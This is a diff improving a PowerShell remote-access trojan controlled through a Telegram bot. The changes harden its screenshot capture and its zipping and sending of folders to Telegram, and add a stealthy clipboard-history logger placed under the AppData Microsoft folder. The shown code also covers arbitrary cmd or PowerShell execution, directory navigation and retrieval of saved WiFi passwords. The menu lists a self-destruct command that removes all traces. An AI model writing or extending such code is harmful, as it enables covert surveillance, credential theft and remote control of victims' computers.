@@ -121,10 +121,20 @@ function Send-Screenshot {
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
 
+        # Use VirtualScreen, but guard against invalid sizes to avoid errors.
         $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $width  = [int]$screen.Width
+        $height = [int]$screen.Height
+
+        if ($width -le 0 -or $height -le 0) {
+            throw "VirtualScreen returned invalid size: ${width}x${height}."
+        }
+
+        $bitmap   = New-Object System.Drawing.Bitmap $width, $height
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+
+        $captureSize = New-Object System.Drawing.Size $width, $height
+        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $captureSize)
 
         $bitmap.Save($screenshotPath)
         $graphics.Dispose()
@@ -169,7 +179,18 @@ function Send-TelegramFolder {
 
     try {
         $zipPath = "$env:TEMP\$(Split-Path $folderPath -Leaf)_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
-        Compress-Archive -Path $folderPath -DestinationPath $zipPath -Force
+
+        # Use .NET ZipFile instead of Compress-Archive, which can throw
+        # "Virtaa ei voitu lukea" / "Cannot read from the stream" on some folders.
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+
+        # Ensure any existing zip at that path is removed first
+        if (Test-Path $zipPath) {
+            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+        }
+
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($folderPath, $zipPath)
+
         $result = Send-TelegramFile -chatId $chatId -filePath $zipPath
         Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
         return $result
@@ -183,7 +204,7 @@ function Get-ClipboardContent {
         Add-Type -AssemblyName System.Windows.Forms
         $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
         if ([string]::IsNullOrEmpty($clipboardText)) {
-            return "Clipboard is empty or contains non-text content."
+            return ""
         }
         return $clipboardText
     } catch {
@@ -215,6 +236,8 @@ C: Drive: $([math]::Round($disk.Size / 1GB, 2)) GB total, $([math]::Round($disk.
         return "Error retrieving system information: $_"
     }
 }
+
+
 
 function Get-WifiPasswords {
     try {
@@ -313,11 +336,26 @@ function Send-TgMessage($ChatId, $Text) {
 
 function Run-LocalCommand($Command, $ShellType) {
     try {
-        if ($ShellType -eq "powershell") {
-            $Output = powershell -NoProfile -Command $Command 2>&1 | Out-String
+        if ([string]::IsNullOrWhiteSpace($Command)) {
+            return "No command provided."
         }
-        else {
-            $Output = cmd.exe /c $Command 2>&1 | Out-String
+
+        $originalLocation = Get-Location
+        try {
+            if ($global:CurrentDirectory -and (Test-Path $global:CurrentDirectory -PathType Container)) {
+                Set-Location $global:CurrentDirectory
+            }
+        } catch {}
+
+        try {
+            if ($ShellType -eq "powershell") {
+                $Output = powershell -NoProfile -Command $Command 2>&1 | Out-String
+            }
+            else {
+                $Output = cmd.exe /c $Command 2>&1 | Out-String
+            }
+        } finally {
+            try { Set-Location $originalLocation } catch {}
         }
     }
     catch {
@@ -534,6 +572,7 @@ SYSTEM CONTROL
 /screenshot            Sends a screenshot
 /pcname                Shows the computer name
 /getclipboard          Gets text from clipboard
+/clearclipboard        Clears stored clipboard history file
 /setclipboard <text>   Sets text to clipboard
 /sysinfo               Displays detailed system information
 /wifi                  Shows all saved WiFi networks and passwords
@@ -628,8 +667,8 @@ function Start-NetworkMonitor {
 }
 # --- ONLINE/OFFLINE NOTIFIER END ---
 
-$botToken = "urbot"
-$userId = "urid"
+$botToken = ""
+$userId = ""
 $apiUrl = "https://api.telegram.org/bot$botToken"
 $lastUpdateId = 0 # Initial default
 
@@ -728,24 +767,34 @@ while ($true) {
             }
 
             if ($text -match "^cd\s+(.+)$") {
-                $targetPath = $matches[1].Trim('"').Trim()
-                if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
-                    $targetPath = Join-Path $global:CurrentDirectory $targetPath
-                }
+                $rawTarget  = $matches[1].Trim()
+                $targetPath = $rawTarget.Trim('"')
                 try {
-                    if ($targetPath -like "\\*") {
+                    # Handle drive-only paths like C: or C:\ explicitly
+                    if ($targetPath -match '^[A-Za-z]:\\?$') {
+                        Set-Location $targetPath
+                        $global:CurrentDirectory = (Get-Location).Path
+                        $reply = "Changed directory to drive: $global:CurrentDirectory"
+                    }
+                    elseif ($targetPath -like "\\*") {
                         Push-Location $targetPath
                         Pop-Location
                         $global:CurrentDirectory = $targetPath
                         $reply = "Changed directory to UNC/network path: $targetPath"
                     }
-                    elseif (Test-Path $targetPath -PathType Container) {
-                        Set-Location $targetPath
-                        $global:CurrentDirectory = (Resolve-Path $targetPath).Path
-                        $reply = "Changed directory to: $global:CurrentDirectory"
-                    }
                     else {
-                        $reply = "Directory not found: $targetPath"
+                        if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
+                            $targetPath = Join-Path $global:CurrentDirectory $targetPath
+                        }
+
+                        if (Test-Path $targetPath -PathType Container) {
+                            Set-Location $targetPath
+                            $global:CurrentDirectory = (Resolve-Path $targetPath).Path
+                            $reply = "Changed directory to: $global:CurrentDirectory"
+                        }
+                        else {
+                            $reply = "Directory not found: $targetPath"
+                        }
                     }
                 } catch {
                     $reply = "Failed to access directory: $_"
@@ -769,7 +818,7 @@ while ($true) {
                         $reply = "Directory '$global:CurrentDirectory' does not exist or is not accessible."
                     } else {
                         # Use ErrorAction Stop to catch all errors
-                        $items = @(Get-ChildItem -Path $global:CurrentDirectory -Force -ErrorAction Stop)
+                        $items = @(Get-ChildItem -LiteralPath $global:CurrentDirectory -Force -ErrorAction Stop)
                         
                         if ($items.Count -gt 0) {
                             $list = foreach ($item in $items) {
@@ -861,8 +910,43 @@ while ($true) {
                 $reply = Send-TelegramFolder -chatId $chatId -folderPath $folderPath
             }
             elseif ($text -eq "/getclipboard") {
-                $clipboardContent = Get-ClipboardContent
-                $reply = "Clipboard content:`n$clipboardContent"
+                # Read current clipboard and append to a log file, then return the file contents
+                $clipboardText = Get-ClipboardContent
+                $logPath = Join-Path $env:APPDATA "Microsoft\Windows\clipboard_history.txt"
+                try {
+                    if (-not [string]::IsNullOrWhiteSpace($clipboardText)) {
+                        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                        $entry = "[$timestamp] $clipboardText`n----`n"
+                        Add-Content -Path $logPath -Value $entry -Encoding UTF8
+                    }
+                } catch {}
+
+                if (Test-Path $logPath) {
+                    $history = Get-Content -Path $logPath -Raw -ErrorAction SilentlyContinue
+                } else {
+                    $history = "No clipboard history saved yet."
+                }
+
+                if ([string]::IsNullOrWhiteSpace($history)) {
+                    $history = "Clipboard history file is empty."
+                }
+
+                if ($history.Length -gt 3500) {
+                    $history = $history.Substring(0, 3500) + "`n...[truncated]"
+                }
+
+                $reply = $history
+            }
+            elseif ($text -eq "/clearclipboard") {
+                $logPath = Join-Path $env:APPDATA "Microsoft\Windows\clipboard_history.txt"
+                try {
+                    if (Test-Path $logPath) {
+                        Clear-Content -Path $logPath -ErrorAction SilentlyContinue
+                    }
+                    $reply = "Clipboard history file has been cleared."
+                } catch {
+                    $reply = "Failed to clear clipboard history file: $_"
+                }
             }
             elseif ($text -match "^/setclipboard\s+(.+)$") {
                 $clipText = $matches[1]
@@ -877,7 +961,6 @@ while ($true) {
                 $wifiPasswords = Get-WifiPasswords
                 $reply = $wifiPasswords
             }
-
             elseif ($text -eq "/selfdestruct") {
                 Send-TelegramMessage -chatId $chatId -message "Are you sure you want to remove all traces of this script? Send '/confirm-selfdestruct' to confirm."
                 continue
